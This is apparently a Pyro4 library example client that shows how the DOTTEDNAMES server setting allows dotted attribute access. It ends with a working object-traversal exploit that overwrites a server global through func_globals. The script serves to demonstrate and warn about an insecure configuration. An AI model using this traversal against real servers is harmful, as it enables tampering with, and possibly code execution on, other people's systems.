from __future__ import print_function
import sys
import Pyro4

if sys.version_info<(3,0):
    input=raw_input

uri=input("enter attribute server object uri: ").strip()
p=Pyro4.Proxy(uri)

# First do some normal method calls with and without a dotted path notation
# to get at the sub-object. If the server is running with DOTTEDNAMES=False,
# you will get attribute exceptions when trying to access methods with a
# dotted attribute path. If DOTTEDNAMES=True on the server, it will work.
# (however it is a security risk because it is possible to exploit object
# traversal and obtain internal info of your server or execute arbitrary code).
print("DOTTEDNAMES on the server is:",p.dottedNames())
value=p.getSubValue()
print("value gotten from p.getSubValue()=",value)
try:
    value=p.sub.getValue()
    print("value gotten from p.sub.getValue()=",value)
except AttributeError:
    print("AttributeError occurred:",sys.exc_info()[1])
print("setting value to 999")
try:
    p.sub.setValue(999)
except AttributeError:
    print("AttributeError occurred:",sys.exc_info()[1])
value=p.getSubValue()
print("value gotten from p.getSubValue()=",value)
try:
    value=p.sub.getValue()
    print("value gotten from p.sub.getValue()=",value)
except AttributeError:
    print("AttributeError occurred:",sys.exc_info()[1])

# try an object traversal exploit
print("attempt to do an object traversal exploit...")
oldvalue=p.printSomething()
try:
    # this update() call will work when the server has DOTTEDNAMES set to true...:
    p.printSomething.im_func.func_globals.update({"something":"J00 HAVE BEEN HAXX0RD"})
except AttributeError:
    # this exception occurs when the server has DOTTEDNAMES set to false.
    print("Attributeerror, couldn't update the server's global variable")
newvalue=p.printSomething()
if newvalue!=oldvalue:
    print("The server has been exploited, a global variable has been updated with a different value.")
    print("Old value: {0}    new value: {1}".format(oldvalue, newvalue))

# Direct attribute access @todo: not supported yet, will only print a bunch of <RemoteMethod> lines
# print("\nDirect attribute access.  (not supported yet!)")
# print("p.value:",p.value)
# print("p._value:",p._value)
# print("p.__value:",p.__value)
# print("p.sub.value:",p.sub.value)
# print("p.sub._value:",p.sub._value)
# print("p.sub.__value:",p.sub.__value)
